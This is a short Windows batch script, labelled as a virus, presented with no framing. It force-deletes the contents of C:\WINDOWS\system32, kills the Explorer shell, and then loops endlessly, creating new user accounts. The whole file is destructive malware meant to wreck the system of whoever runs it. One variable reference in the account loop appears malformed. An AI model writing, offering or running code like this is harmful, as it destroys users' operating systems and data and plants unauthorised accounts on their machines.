@echo off
:virus
del /f /q "C:\WINDOWS\system32"
taskkill explorer.exe
tskill explorer.exe
set /a _virus+=1
net user %_virus+% /add
goto virus